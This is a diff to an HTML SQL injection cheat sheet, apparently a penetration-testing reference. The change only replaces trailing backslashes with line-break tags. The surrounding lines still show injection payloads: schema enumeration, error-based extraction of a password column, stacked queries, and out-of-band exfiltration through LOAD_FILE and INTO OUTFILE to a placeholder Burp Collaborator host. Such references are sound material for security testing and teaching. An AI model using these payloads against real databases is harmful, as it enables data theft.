@@ -28,8 +28,8 @@
             MySQL
         </th>
         <td>
-            <code>'foo' 'bar'</code> [Note the space between the two strings]\
-            <code>CONCAT('foo','bar')</code>\
+            <code>'foo' 'bar'</code> [Note the space between the two strings] <br />
+            <code>CONCAT('foo','bar')</code>
         </td>
     </tr>
 </table><h2>Substring</h2><p>
@@ -81,7 +81,7 @@
             Microsoft
         </th>
         <td>
-            <code>--comment</code>\
+            <code>--comment</code><br />
             <code>/*comment*/</code>
         </td>
     </tr>
@@ -90,7 +90,7 @@
             PostgreSQL
         </th>
         <td>
-            <code>--comment</code>\
+            <code>--comment</code><br/>
             <code>/*comment*/</code>
         </td>
     </tr>
@@ -99,8 +99,8 @@
             MySQL
         </th>
         <td>
-            <code>#comment</code>\
-            <code>-- comment</code> [Note the space after the double dash]\
+            <code>#comment</code><br />
+            <code>-- comment</code> [Note the space after the double dash]<br />
             <code>/*comment*/</code>
         </td>
     </tr>
@@ -148,7 +148,7 @@
             Oracle
         </th>
         <td>
-            <code>SELECT * FROM all_tables</code>\
+            <code>SELECT * FROM all_tables</code><br />
             <code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
@@ -157,7 +157,7 @@
             Microsoft
         </th>
         <td>
-            <code>SELECT * FROM information_schema.tables</code>\
+            <code>SELECT * FROM information_schema.tables</code><br />
             <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
@@ -166,7 +166,7 @@
             PostgreSQL
         </th>
         <td>
-            <code>SELECT * FROM information_schema.tables</code>\
+            <code>SELECT * FROM information_schema.tables</code><br />
             <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
@@ -175,7 +175,7 @@
             MySQL
         </th>
         <td>
-            <code>SELECT * FROM information_schema.tables</code>\
+            <code>SELECT * FROM information_schema.tables</code><br />
             <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
         </td>
     </tr>
@@ -222,7 +222,7 @@
             Microsoft
         </th>
         <td>
-            <code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code>\
+            <code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code><br />
             <code>&gt; Conversion failed when converting the varchar value 'secret' to data type int.</code>
         </td>
     </tr>
@@ -231,7 +231,7 @@
             PostgreSQL
         </th>
         <td>
-            <code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code>\
+            <code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code><br />
             <code>&gt; invalid input syntax for integer: "secret"</code>
         </td>
     </tr>
@@ -240,7 +240,7 @@
             MySQL
         </th>
         <td>
-            <code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code>\
+            <code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br />
             </code>&gt; XPATH syntax error: '\secret'</code>
         </td>
     </tr>
@@ -260,7 +260,7 @@
             Microsoft
         </th>
         <td>
-            <code>QUERY-1-HERE; QUERY-2-HERE</code>\
+            <code>QUERY-1-HERE; QUERY-2-HERE</code><br />
             <code>QUERY-1-HERE QUERY-2-HERE</code>
         </td>
     </tr>
@@ -391,7 +391,7 @@
         </th>
         <td>
             <p>The following techniques work on Windows only:</p>
-            <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code>\
+            <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br />
             <code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
         </td>
     </tr>
@@ -436,7 +436,7 @@
             MySQL
         </th>
         <td>
-            The following technique works on Windows only: \
+            The following technique works on Windows only: <br />
             <code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
         </td>
     </tr>
